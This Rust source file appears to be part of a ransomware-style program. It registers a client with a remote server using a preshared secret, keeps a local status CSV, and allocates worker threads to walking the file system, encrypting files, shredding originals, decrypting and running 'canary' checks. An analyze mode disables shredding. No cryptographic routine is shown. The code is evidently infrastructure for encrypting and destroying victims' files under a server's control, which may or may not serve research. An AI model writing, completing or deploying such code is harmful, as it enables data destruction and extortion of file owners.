use std::{
    path::{Path, PathBuf},
    sync::Arc,
    thread::available_parallelism,
};

use anyhow::Context;
use flume::Receiver;
use tracing::{debug, error, warn};

use crate::{
    canary::canary_active,
    comm::{ServerConn, register},
    config,
    status::{Status, create_status, export_status_csv, import_status_csv},
};

pub fn initialize_client(
    exe_path_dir: &Path,
    conn: &ServerConn,
    preshared_secret: &str,
) -> anyhow::Result<Status> {
    let existing =
        import_status_csv(exe_path_dir).context("failed to import existing status CSV")?;
    if let Some(csv) = existing {
        debug!("Successfully imported status");
        return Ok(csv);
    }
    warn!("Existing status not imported");
    let new_status = create_status();
    register(conn, &new_status, preshared_secret).context("failed to register with server")?;
    export_status_csv(exe_path_dir, &new_status).context("failed to export status CSV")?;
    debug!("Created new status");
    Ok(new_status)
}

#[derive(Clone, Copy, Debug)]
pub struct ThreadCounts {
    pub walk: usize,
    pub shred: usize,
    pub encrypt: usize,
    pub decrypt: usize,
    pub canary: usize,
}

pub fn thread_counts() -> ThreadCounts {
    let thread_count = match available_parallelism() {
        Ok(suggested) => {
            debug!(suggested, "Successfully got suggested number of threads");
            suggested.get()
        }
        Err(error) => {
            error!(error = ?error, "Failed to get suggested number of threads");
            1
        }
    };

    let canary_active = canary_active();
    let shred_active = !config::ANALYZE_MODE;

    let walk_count = if thread_count >= 4 {
        (thread_count / 4).max(2)
    } else {
        1
    };
    let canary_count = if canary_active {
        (thread_count / 6).max(1)
    } else {
        0
    };
    let shred_count = if shred_active {
        (thread_count / 6).max(1)
    } else {
        0
    };

    let encrypt_count = thread_count
        .saturating_sub(walk_count + canary_count + shred_count)
        .max(1);

    let decrypt_count = thread_count.saturating_sub(walk_count).max(1);

    debug!(
        walk_count,
        canary_count, encrypt_count, shred_count, decrypt_count, "Using worker thread counts"
    );

    ThreadCounts {
        walk: walk_count,
        shred: shred_count,
        encrypt: encrypt_count,
        decrypt: decrypt_count,
        canary: canary_count,
    }
}

pub fn channel_capacity(consumers: usize) -> usize {
    (consumers * 2).max(64)
}

pub fn recv_path(receiver: &Receiver<Arc<PathBuf>>) -> Option<Arc<PathBuf>> {
    match receiver.recv() {
        Ok(path) => {
            debug!(path = %path.display(), "Received file path over channel");
            Some(path)
        }
        Err(error) => {
            debug!(error = ?error, "Channel closed, worker exiting");
            None
        }
    }
}
